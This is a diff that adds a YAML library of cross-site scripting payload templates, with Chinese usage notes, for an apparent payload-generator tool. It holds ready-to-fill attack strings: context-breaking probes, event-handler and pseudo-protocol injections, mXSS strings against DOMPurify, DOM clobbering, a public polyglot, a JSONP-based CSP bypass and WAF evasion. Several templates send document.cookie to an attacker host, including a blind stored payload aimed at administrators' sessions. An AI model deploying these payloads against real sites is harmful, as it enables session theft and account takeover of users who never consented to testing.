@@ -1,0 +1,616 @@
+ruleDB: v0.1.0
+# 跨站脚本模板（反射型 + 存储型 / 盲打 + DOM 型）。
+#
+# 这一类的载荷**全是 HTML / JS 文本片段**，content_type 一律 html——渲染出的是
+# 要粘进参数里的片段，不是完整文档。语法校验那边 html 无可靠 parser，会如实
+# 标注「未校验」，不假装验过（方案 §10.2）。
+#
+# 与其他漏洞类型最大的不同：**requires 只描述服务端前提**。
+# 回显、存储、DOM sink 都是「载荷要生效，目标必须具备」的条件；而
+# 「Cookie 读不读得到」是浏览器侧的事，所以只有真去读 document.cookie 的那几条
+# 才声明 no-httponly——alert 探针声明它只会白筛掉模板。
+#
+# 标签变形不在这里做：`<scr<script>ipt>` 双写、`<ScRiPt>` 大小写混排是
+# data/bypasses.yaml 里的 bypass.xss.tag.split / bypass.xss.tag.case，
+# 载荷里重复实现一遍会让两者叠加出怪串。
+#
+# 关于 js 槽位：要执行的 JS 会因目标而异（验证执行 / 读域名 / 读 Cookie），
+# 所以做成槽位让用户选，不写死。三条取值覆盖 CTF 与实战的绝大多数场合。
+
+templates:
+  # ---- 基础探测 ----
+
+  - id: xss.generic.probe.reflect
+    name: 反射点探针（特殊字符）
+    desc: 第一步先发这条：看响应里单引号、双引号、尖括号哪些被转义或删掉，再决定用哪条模板；它本身不执行任何东西，别拿它当注入成功的证据
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: |-
+      xss'"<>
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.probe.script
+    name: 基础 script 标签
+    desc: 输入落在 HTML 正文里、尖括号没被转义时用；落在属性值或已有 script 块里时换 probe.quote / break.tag，硬发这条只会得到一段不执行的文本
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <script><<js>></script>
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.probe.quote
+    name: 闭合属性引号后插标签
+    desc: 输入落在属性值里（形如 value= 后面那对引号之间）时用；先闭合引号与标签再加 script。取值先选与目标一致的那种引号，选错等于没闭合
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      # 四种写法分开列：`">` 与 `'>` 用于「闭合引号 + 结束当前标签」，
+      # 单引号与双引号只用于「输入落在 script 块的 JS 字符串里」那种上下文。
+      close:
+        options:
+          - '">'
+          - "'>"
+          - '"'
+          - "'"
+        default: '">'
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <<close>><script><<js>></script>
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 标签 + 事件 ----
+
+  - id: xss.generic.probe.tag
+    name: 标签携带事件
+    desc: script 关键字被拦时最常用的一条：换一个能自动触发事件的标签。head 与 tail 必须配套（input 少了 autofocus、details 少了 open 就不会自己触发），所以做成字典槽位
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      # 字段拆成 head / tail：标签名与它自带的那串属性必须一起选，
+      # 拆成两个独立槽位用户能拼出 `<input onload=` 这种永不触发的串。
+      tag:
+        options:
+          - {id: img,     name: "<img src=x onerror=",        head: "<img src=x onerror=",        tail: ">"}
+          - {id: svg,     name: "<svg onload=",               head: "<svg onload=",               tail: ">"}
+          - {id: body,    name: "<body onload=",              head: "<body onload=",              tail: ">"}
+          - {id: input,   name: "<input autofocus onfocus=",  head: "<input autofocus onfocus=",  tail: ">"}
+          - {id: details, name: "<details open ontoggle=",    head: "<details open ontoggle=",    tail: ">"}
+          # 要带一个必然加载失败的 src，否则 source 没有可失败的资源，onerror 未必触发
+          # （同槽位的 img 就是 src=x 这个约定）
+          - {id: source,  name: "<video><source src=x onerror=", head: "<video><source src=x onerror=", tail: ">"}
+        default: img
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <<tag.head>><<js>><<tag.tail>>
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.probe.slash
+    name: 自闭合斜杠写法
+    desc: 空格被过滤、或过滤器按「标签名 + 空格」匹配时用：用斜杠顶替空格把标签名和事件属性隔开。目标没有空格过滤时用 probe.tag 更直观
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      tag:
+        options:
+          - {id: svg,     name: "<svg/onload=",       head: "<svg",         event: "onload",   tail: ">"}
+          - {id: body,    name: "<body/onload=",      head: "<body",        event: "onload",   tail: ">"}
+          - {id: img,     name: "<img src=x/onerror=", head: "<img src=x",  event: "onerror",  tail: ">"}
+          - {id: details, name: "<details open/ontoggle=", head: "<details open", event: "ontoggle", tail: ">"}
+        default: svg
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <<tag.head>>/<<tag.event>>=<<js>><<tag.tail>>
+    vars: []
+    requires: [reflect, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.probe.attr
+    name: 属性内事件（不新建标签）
+    desc: 尖括号被过滤、但引号和等号还能用时用：在原有标签里补一个事件属性，不新建标签。事件要用户交互才触发（onmouseover / onclick），目标是自动化访问时别指望它
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      close:
+        options: ['"', "'"]
+        default: '"'
+      event:
+        options: ["onmouseover", "onclick", "onfocus", "onanimationstart"]
+        default: "onmouseover"
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    # 结尾补一个 x= 和一个同种引号，把原标签剩下的属性关回字符串里，
+    # 否则后面的内容会溢出成新的属性、把标签结构弄坏。
+    body: <<close>> <<event>>=<<js>> x=<<close>>
+    vars: []
+    requires: [reflect, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 伪协议 ----
+
+  - id: xss.generic.scheme.javascript
+    name: javascript 伪协议
+    desc: 输入落在地址位（a 的 href、iframe 的 src、form 的 action）时用；href 上要用户点一下才执行，iframe src 加载即执行，img src 不行
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: javascript:<<js>>
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.scheme.data
+    name: data 伪协议携带 HTML
+    desc: 同样是地址位，但整段 HTML 由浏览器当文档解析，比 javascript 限制少；data 后面的内容用 Base64 编好再填进 b64，否则逗号、引号会被属性或 WAF 截断
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: data:text/html;base64,<<b64>>
+    vars: [b64]
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 闭合已有标签 ----
+
+  - id: xss.generic.break.tag
+    name: 闭合已有标签后插 script
+    desc: 输入落在 script / textarea / title / style 这些「内容被特殊解析」的块里时用；先闭合当前块再开新块。落点是属性值时改用 probe.quote
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      # 四种闭合标签必须与目标所在的块一一对应，所以做成字典槽位。
+      ctx:
+        options:
+          - {id: script,   name: "在 <script> 块里",   close: "</script>"}
+          - {id: textarea, name: "在 <textarea> 里",   close: "</textarea>"}
+          - {id: title,    name: "在 <title> 里",      close: "</title>"}
+          - {id: style,    name: "在 <style> 里",      close: "</style>"}
+        default: script
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <<ctx.close>><script><<js>></script>
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.break.template
+    name: 闭合 JS 模板字面量
+    desc: 输入落在 script 块里的反引号模板串（形如 const a = `输入`）里时用；闭合模板串后插插值。目标用的是普通引号串时这条不生效，改用 probe.quote
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: "${<<js>>}"
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 实体编码 ----
+
+  - id: xss.generic.entity.encode
+    name: 实体编码绕过
+    desc: 目标把尖括号实体化、或 WAF 会先解一次实体时用。注意：正文里直接回显的实体不会被浏览器二次建标签，这条只在「解出来的字符还会再进一次 HTML 解析」的链路上有效
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      enc:
+        options:
+          - {id: hex,   name: "十六进制 &#x3c;", lt: "&#x3c;", gt: "&#x3e;"}
+          - {id: dec,   name: "十进制 &#60;",    lt: "&#60;",  gt: "&#62;"}
+          - {id: named, name: "命名实体 &lt;",   lt: "&lt;",   gt: "&gt;"}
+        default: hex
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <<enc.lt>>script<<enc.gt>><<js>><<enc.lt>>/script<<enc.gt>>
+    vars: []
+    requires: [reflect, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 窃取 Cookie ----
+  # 这几条只回传 document.cookie，所以必须声明 no-httponly：
+  # 目标给会话 Cookie 加了 HttpOnly 时，载荷照常执行、但带回来的是一串空值。
+
+  - id: xss.generic.cookie.image
+    name: 窃取 Cookie（Image 对象）
+    desc: 验证执行之后拿会话用；Image 不挑浏览器、不受 CORS 限制，是最稳的带外方式。受害者的浏览器上不了外网、或 Cookie 带了 HttpOnly 时都拿不到东西
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script>new Image().src='http://<<lhost>>/?c='+document.cookie</script>
+    vars: [lhost]
+    requires: [reflect, no-httponly, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.cookie.fetch
+    name: 窃取 Cookie（fetch）
+    desc: 与 Image 版等价，用在页面已有 CSP 只放行 connect-src 的场合；fetch 受 CORS 限制，回传端不回 ACAO 头时请求照发、响应被拦，取值不受影响
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script>fetch('http://<<lhost>>/?c='+document.cookie)</script>
+    vars: [lhost]
+    requires: [reflect, no-httponly, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.cookie.btoa
+    name: 窃取 Cookie（Base64 编码）
+    desc: Cookie 里有分号、等号、中文这类会截断 URL 的字符时用；btoa 遇到 Latin-1 以外的字符会抛异常，那种情况改用 encodeURIComponent 的思路手写
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script>new Image().src='http://<<lhost>>/?c='+btoa(document.cookie)</script>
+    vars: [lhost]
+    requires: [reflect, no-httponly, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 盲打（存储型）----
+
+  - id: xss.generic.blind.beacon
+    name: 盲打探针（只证明执行）
+    desc: 存储型的第一步：留言、工单、UA 这类入口提交后自己看不到回显，先用只带一个固定标记的请求确认「后台真的执行了」。它不读 Cookie，所以不需要 no-httponly
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script>new Image().src='http://<<lhost>>/?x=1'</script>
+    vars: [lhost]
+    requires: [stored, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.blind.stored
+    name: 盲打窃取 Cookie（存储型）
+    desc: 确认盲打执行之后用：载荷存进库，等管理员在后台打开那条记录时把 Cookie 带出来。回显和存储是两回事，这条不需要 reflect
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    body: <script>new Image().src='http://<<lhost>>/?c='+document.cookie</script>
+    vars: [lhost]
+    requires: [stored, no-httponly, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- DOM 型 ----
+
+  - id: xss.generic.dom.fragment
+    name: DOM 型（URL fragment）
+    desc: 前端把 location.hash 写进 innerHTML / document.write 这类 sink 时用；fragment 不会发给服务端，所以服务端有没有过滤都无所谓，也不需要 reflect
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      tag:
+        options:
+          - {id: img,     name: "<img src=x onerror=",        head: "<img src=x onerror=",        tail: ">"}
+          - {id: svg,     name: "<svg onload=",               head: "<svg onload=",               tail: ">"}
+          - {id: details, name: "<details open ontoggle=",    head: "<details open ontoggle=",    tail: ">"}
+        default: img
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: "#<<tag.head>><<js>><<tag.tail>>"
+    vars: []
+    requires: [dom-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 突变型（mXSS）与 DOM 覆盖 ----
+  # 这两条不靠「服务端没过滤」，靠的是**解析器行为**：净化器放行的串在第二轮解析里
+  # 变异出可执行的结构（mXSS），或者页面上的元素顶掉了 JS 以为存在的全局变量
+  # （DOM clobbering）。所以除了 reflect 还要 dom-sink——数据必须再进一次浏览器的
+  # DOM 解析才成立。目标只把输入当文本输出、不再进 DOM 时两条都不成立。
+
+  - id: xss.generic.mxss.mutated
+    name: mXSS（净化后重新解析时变异）
+    desc: >-
+      目标有 HTML 净化器（DOMPurify 这类）、且净化后的串会再被 innerHTML / document.write 解析一次时用。
+      同一个串在两轮解析里的结果不一样：净化器看到的是一段无害的属性值，浏览器重新解析时它把标签拆开了。
+      四个选项对应四类已知的变异点，按目标的净化器与浏览器挑。noscript 与 xmp 两种靠的是
+      raw-text 元素自身的解析规则，相对通用；form+math 与 svg+style 两种只在 DOMPurify 2.0.x
+      一类没做命名空间归属检查的版本上成立。目标只净化一次、之后以纯文本输出时这条不成立。
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      mxss:
+        options:
+          - {id: noscript,  name: "noscript + p title（head 里的 noscript 会被特殊解析）", head: '<noscript><p title="</noscript><img src=x onerror=', tail: '">'}
+          - {id: xmp,       name: "xmp + p title（raw text 元素同样会被重解析）",          head: '<xmp><p title="</xmp><img src=x onerror=', tail: '">'}
+          - {id: form_math, name: "form + math + mglyph（命名空间混淆，DOMPurify 2.0.x）",  head: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=', tail: '>'}
+          - {id: svg_style, name: "svg + style（同上的另一条）",                          head: '<svg></p><style><a id="</style><img src=1 onerror=', tail: '">'}
+        default: noscript
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <<mxss.head>><<js>><<mxss.tail>>
+    vars: []
+    requires: [reflect, dom-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xss.generic.dom.clobber
+    name: DOM clobbering（元素顶掉全局变量）
+    desc: >-
+      前端的判断依赖一个没声明的全局变量（if (config) / if (csrf) / x.y.value 这类）时用。
+      带 id 或 name 的元素会成为同名全局变量，于是这些判断读到的是你造出来的元素而不是配置对象，
+      常见后果是校验分支被跳过、或者被读走一个攻击者控制的 URL。三种形态按目标代码里
+      用到几层取值挑：只判真值用 img name，要读 x.y.value 用 form+input，要读 x.y.href 用同名两个 a。
+      它本身不执行脚本，是给同一页上别的代码段递刀子的——没有那个下游判断时什么也不会发生。
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      shape:
+        options:
+          - {id: form_input, name: "form + input（读得到 x.y.value）",         html: '<form id="<<name>>" name="<<name>>"><input name="<<prop>>" value="<<value>>"></form>'}
+          - {id: img_name,   name: "img name（只骗真值判断，x 是个元素对象）", html: '<img name="<<name>>">'}
+          - {id: two_anchor, name: "同名两个 a（x 变集合，x.y 取到第二个元素）", html: '<a id="<<name>>"></a><a id="<<name>>" name="<<prop>>" href="<<value>>"></a>'}
+        default: form_input
+    body: "<<shape.html>>"
+    vars: [name, prop, value]
+    requires: [reflect, dom-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 广谱载荷 ----
+
+  - id: xss.generic.polyglot
+    name: 多上下文通吃的 polyglot
+    desc: >-
+      不知道注入点落在哪种上下文里（HTML 正文 / 双引号属性 / 单引号属性 / JS 字符串 / URL）
+      时先发这一条，一次覆盖五种。它是公开的 0xsobky「Ultimate XSS Polyglot」原文，
+      靠混合大小写的协议名、注释符、反引号与引号层层闭合，中间那段 %0D%0A%0d%0a
+      是用来跳出单行 JS 注释的。代价是又长又杂：**目标已有明确过滤规则时它一定被拦**，
+      那种场合改用针对该上下文的那条（probe.quote / probe.attr / break.template）。
+      它证明不了任何单点结论，只能告诉你「这个注入点还没被堵死」。
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: |-
+      jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=<<js>> )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=<<js>>//>\x3e
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- CSP 存在时的绕过 ----
+  # 目标有 CSP 时，inline script 与事件属性都被 script-src 挡掉，但**白名单里的域名**
+  # 仍然可以加载脚本。所以这条路不是绕 CSP 本身，而是让 CSP 替你放行一个能执行代码的端点。
+
+  - id: xss.generic.csp.jsonp
+    name: 借白名单域上的 JSONP 端点绕 CSP
+    desc: >-
+      目标配了 CSP、script-src 里带着第三方域名（CDN、统计、老接口域）时用。
+      白名单域上只要有任一个把查询参数当回调名回显的 JSONP 端点，就能借它执行任意 JS——
+      CSP 拦的是「脚本从哪来」，而这里脚本正是从白名单域来的。先读响应头里的 CSP 找出
+      script-src 列表，再逐个域名找 ?callback= 这类端点。回调名必须是合法的 JS 标识符，
+      所以载荷里写死 alert；要换成别的函数名直接改这一段。目标没有 CSP、或白名单里
+      只有静态资源域名时这条不成立，硬凑不了。
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      cb:
+        options: [callback, cb, jsonp, _callback, callBack]
+        default: callback
+    body: <script src="https://<<trusted>>/<<endpoint>>?<<cb>>=alert"></script>
+    vars: [trusted, endpoint]
+    requires: [reflect, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 前端框架的原始 HTML sink ----
+
+  - id: xss.generic.framework.rawhtml
+    name: 框架的原始 HTML sink（v-html / dangerouslySetInnerHTML）
+    desc: >-
+      数据被绑到 Vue 的 v-html、React 的 dangerouslySetInnerHTML、或任何直接写 innerHTML
+      的绑定点上时用。这类 sink 不做净化，但**script 标签不会执行**——innerHTML 插入的
+      script 从来就不跑，所以必须走事件属性（img 的 onerror、svg 的 onload）。
+      同一条数据走 Vue 的 {{ }} 插值或 JSX 的字符串子节点时是转义的，那种落点这条不生效，
+      得先找到真正的 raw sink。React 里连属性值也是转义的，属性闭合那条路走不通。
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      tag:
+        options:
+          - {id: img,     name: "<img src=x onerror=（src 必然加载失败才会触发）", head: '<img src=x onerror=', tail: '>'}
+          - {id: svg,     name: "<svg onload=",                                    head: '<svg onload=', tail: '>'}
+          - {id: details, name: "<details open ontoggle=",                         head: '<details open ontoggle=', tail: '>'}
+          - {id: input,   name: "<input autofocus onfocus=",                       head: '<input autofocus onfocus=', tail: '>'}
+        default: img
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <<tag.head>><<js>><<tag.tail>>
+    vars: []
+    requires: [dom-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 属性上下文里的伪协议 ----
+  # scheme.javascript / scheme.data 给的是**裸的伪协议串**（粘进已有的属性里）。
+  # 这里给的是**带完整标签**的版本：落点没有现成标签可用、或者要借 srcdoc 这类
+  # 「属性值本身被当文档解析」的位置时用。
+
+  - id: xss.generic.scheme.tag
+    name: 带标签的伪协议（href / src / srcdoc / data）
+    desc: >-
+      注入点能新建标签、且落点是某个「地址位」或「文档位」时用。srcdoc 最特殊：
+      它的属性值会被当独立的 HTML 文档解析，所以里面直接写 script 就行，不需要引号闭合；
+      但也因此受父页面的 CSP 管，没绕开任何东西。iframe src 的 javascript: 加载即执行，
+      a href 与 form action 都要用户点一下才执行。object data 只在部分浏览器与老内核上有效，
+      现代 Chrome 基本不执行，别当首选。整段内容落在**双引号属性里面**时，
+      引号要先闭合再用 probe.quote 那条。
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      tag:
+        options:
+          - {id: iframe_srcdoc, name: "<iframe srcdoc=（属性值被当独立文档解析，加载即执行）", head: '<iframe srcdoc="<script>', tail: '</script>"></iframe>'}
+          - {id: iframe_src,    name: "<iframe src=javascript:（加载即执行）",              head: '<iframe src="javascript:', tail: '"></iframe>'}
+          - {id: object_data,   name: "<object data=javascript:（只在部分浏览器上有效）",    head: '<object data="javascript:', tail: '"></object>'}
+          - {id: a_href,        name: "<a href=javascript:（要用户点一下）",                 head: '<a href="javascript:', tail: '">click</a>'}
+          - {id: form_action,   name: "<form action=javascript:（要用户点提交）",            head: '<form action="javascript:', tail: '"><input type="submit"></form>'}
+        default: iframe_srcdoc
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <<tag.head>><<js>><<tag.tail>>
+    vars: []
+    requires: [reflect]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- WAF / 过滤器绕过写法 ----
+
+  - id: xss.generic.waf.attrsep
+    name: 属性间用编码空白分隔（属性不加引号）
+    desc: >-
+      过滤器按「一个空格 + 属性名」匹配标签内部结构时用：标签名与属性之间、属性与属性之间
+      改用什么分隔，属性值一律不加引号。前四种是**真的空白字符**（多个空格、%0c），
+      直接落在页面里就成立；%0a / %09 是百分号编码形态，只有当值会**先被解码一次**
+      再写进 HTML 时才成立——服务端原样写进去的话浏览器看到的是字面的 %0a，
+      标签会变成 <img%0asrc=x 这种无效标签名，什么也不会触发。目标没做这层匹配时
+      用 probe.tag 更直观。
+    vuln: [xss]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      gap:
+        options:
+          - {id: sp,  name: "多个空格（过滤器只按单空格匹配时）",        seq: "   "}
+          - {id: ff,  name: "%0c 换页符（真空白字符，直接落在页面里也行）", seq: "\f"}
+          - {id: nl,  name: "%0a（值会先被解码一次时用）",              seq: "%0a"}
+          - {id: tab, name: "%09（值会先被解码一次时用）",              seq: "%09"}
+        default: sp
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: <img<<gap.seq>>src=x<<gap.seq>>onerror=<<js>>>
+    vars: []
+    requires: [reflect, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
